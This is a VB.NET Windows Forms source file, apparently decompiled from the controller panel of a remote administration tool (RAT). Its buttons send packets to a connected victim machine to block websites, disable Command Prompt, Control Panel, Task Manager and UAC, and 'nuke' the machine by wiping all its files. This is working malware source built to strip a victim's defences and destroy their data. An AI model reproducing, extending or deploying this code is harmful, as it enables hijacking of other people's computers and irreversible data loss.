Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class RemoteAdminTools
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub btn_blockwebsite_Click(sender As Object, e As EventArgs) Handles btn_blockwebsite.Click
        Me.LV_BlockWebsites.Items.Add(Me.tb_website.Text, 0)
        Me.SendPacket(New Object() {CByte(&H69), Me.tb_website.Text})
        Me.tb_website.Clear()
    End Sub

    Private Sub btn_disablecmd_Click(sender As Object, e As EventArgs) Handles btn_disablecmd.Click
        Me.SendPacket(New Object() {CByte(&H77)})
        If (Me.btn_disablecmd.Text = "Disable Command Prompt") Then
            Me.btn_disablecmd.Text = "Enable Command Prompt"
        Else
            Me.btn_disablecmd.Text = "Disable Command Prompt"
        End If
    End Sub

    Private Sub btn_disablecontrolpanel_Click(sender As Object, e As EventArgs) Handles btn_disablecontrolpanel.Click
        Me.SendPacket(New Object() {CByte(&H75)})
        If (Me.btn_disablecontrolpanel.Text = "Disable Control Panel") Then
            Me.btn_disablecontrolpanel.Text = "Enable Control Panel"
        Else
            Me.btn_disablecontrolpanel.Text = "Disable Control Panel"
        End If
    End Sub

    Private Sub btn_disabletaskmgr_Click(sender As Object, e As EventArgs) Handles btn_disabletaskmgr.Click
        Me.SendPacket(New Object() {CByte(120)})
        If (Me.btn_disabletaskmgr.Text = "Disable TaskManager") Then
            Me.btn_disabletaskmgr.Text = "Enable TaskManager"
        Else
            Me.btn_disabletaskmgr.Text = "Disable TaskManager"
        End If
    End Sub

    Private Sub btn_disableuac_Click(sender As Object, e As EventArgs) Handles btn_disableuac.Click
        Me.SendPacket(New Object() {CByte(&H76)})
        If (Me.btn_disableuac.Text = "Disable UAC") Then
            Me.btn_disableuac.Text = "Enable UAC"
        Else
            Me.btn_disableuac.Text = "Disable UAC"
        End If
    End Sub

    Private Sub ButtonNuke_Click(sender As Object, e As EventArgs) Handles ButtonNuke.Click
        If (((MessageBox.Show("Do you really want to nuke the Clients Computer?", "Nuke", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) = DialogResult.Yes) AndAlso (MessageBox.Show("This will completely wipe out all files on the Remote Machine!", "Nuke", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) = DialogResult.OK)) AndAlso (MessageBox.Show("This will make the User to completely reinstall his Operating System! Do you want to proceed ?", "Nuke", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = DialogResult.Yes)) Then
            Me.SendPacket(New Object() {CByte(&H68)})
            MessageBox.Show("Wiping out... This could take a while!", "Be patient", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End If
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
        GC.Collect()
    End Sub

    Private Sub tb_website_KeyDown(sender As Object, e As KeyEventArgs) Handles tb_website.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Me.btn_blockwebsite_Click(Nothing, Nothing)
        End If
    End Sub

    Private Sub UnBlockAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnBlockAllToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Me.SendPacket(New Object() {CByte(&H6A)})
            Try
                enumerator = Me.LV_BlockWebsites.Items.GetEnumerator
                Do While enumerator.MoveNext
                    enumerator.Current.Remove()
                Loop
            Finally
                If (Not enumerator Is Nothing) Then
                    enumerator.Dispose()
                End If
            End Try
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        BlockWebsite = &H69
        DisableCMD = &H77
        DisableControlPanel = &H75
        DisableTaskmgr = 120
        DisableUAC = &H76
        Nuke = &H68
        UnBlockWebsite = &H6A
    End Enum
End Class